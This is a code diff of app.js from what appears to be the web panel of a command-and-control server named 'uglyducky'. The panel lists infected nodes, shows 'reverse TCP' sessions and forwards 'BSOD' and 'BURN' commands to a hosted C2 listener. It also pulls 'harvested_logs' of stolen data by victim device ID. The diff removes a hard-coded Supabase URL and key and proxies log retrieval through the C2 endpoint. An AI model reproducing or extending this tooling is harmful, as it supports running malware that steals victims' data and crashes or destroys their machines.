@@ -1,11 +1,10 @@
 // File: app.js
 // ==================================================================
-// --- CONFIGURATION - PASTE YOUR URLS AND KEYS HERE ---
+// --- CONFIGURATION ---
 // ==================================================================
-const C2_LISTENER_URL = "https://uglyducky-c2-listener.onrender.com"; // [FIXED] Your actual Render URL
-
-const SUPABASE_URL = "https://azonyysxbizkykdowsma.supabase.co/rest/v1/harvested_logs";
-const SUPABASE_KEY = "sb_publishable_-LlPFHiz2oLK4jhP6tIwOw_88BiAcIg";
+// All traffic (commands and data fetching) routes through your Render Hub.
+// NO API KEYS ARE STORED HERE.
+const C2_LISTENER_URL = "https://uglyducky-c2-listener.onrender.com"; 
 // ==================================================================
 
 // --- GLOBAL STATE ---
@@ -321,16 +320,13 @@ function renderMap() {
     });
 }
 
-// [NEW] Function to handle node selection
 window.selectNode = function(nodeId) {
     activeNodeId = nodeId;
     termLog(`Selected node: ${nodeId}`);
     
-    // Update UI elements
     document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via reverse TCP`;
     document.getElementById('fs-active-node').innerText = nodeId;
 
-    // Re-render the nodes list to show the new active selection
     renderNodesList();
 };
 
@@ -356,7 +352,7 @@ window.executeTermCommand = function(inputEl) {
     setTimeout(() => {
         if(val.toLowerCase() === 'clear') { term.innerHTML = `<div class="text-green-400">C:\\Users\\John> <span class="cursor-blink"></span></div>`; inputEl.value = ''; return; }
         
-        // If they type a known command, route it to Render
+        // Route known commands to Render
         if(val.toUpperCase() === 'BSOD' || val.toUpperCase() === 'BURN') {
             termLog(`Forwarding command to C2 server...`);
             if (val.toUpperCase() === 'BURN') {
@@ -408,7 +404,7 @@ window.triggerUpload = function() { document.getElementById('fileUploadInput').c
 document.getElementById('fileUploadInput').onchange = function(e) { if(e.target.files[0]) showToast(`Uploaded ${e.target.files[0].name}`); };
 
 // ==========================================
-// DATA EXTRACTION (Vault Mock/Fetch)
+// DATA EXTRACTION (Proxied via Render)
 // ==========================================
 document.getElementById("deviceId").addEventListener("keypress", function(e) {
     if (e.key === "Enter") { e.preventDefault(); fetchData(); }
@@ -425,7 +421,7 @@ window.fetchData = async function() {
     if (!deviceId) return showToast("Target Identifier missing.", "error");
 
     statusMsg.classList.remove('hidden');
-    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Decrypting vault nodes...';
+    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Fetching vault nodes securely via C2...';
     btn.disabled = true;
     btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';
     outputDiv.innerHTML = "";
@@ -433,12 +429,12 @@ window.fetchData = async function() {
     exportBtn.classList.add('hidden');
 
     try {
-        const response = await fetch(`${SUPABASE_URL}?device_id=eq.${deviceId}&order=created_at.desc`, {
-            method: 'GET',
-            headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' }
+        // Fetching through the secure proxy endpoints!
+        const response = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
+            method: 'GET'
         });
 
-        if (!response.ok) throw new Error("API Error");
+        if (!response.ok) throw new Error("API Proxy Error");
         const data = await response.json();
 
         if (data.length === 0) {
@@ -588,7 +584,6 @@ window.copyData = function(btnElement) {
     });
 };
 
-// [NEW] Function to export logs as JSON
 window.exportLogs = function() {
     if (globalData.length === 0) {
         showToast("No data to export.", "error");
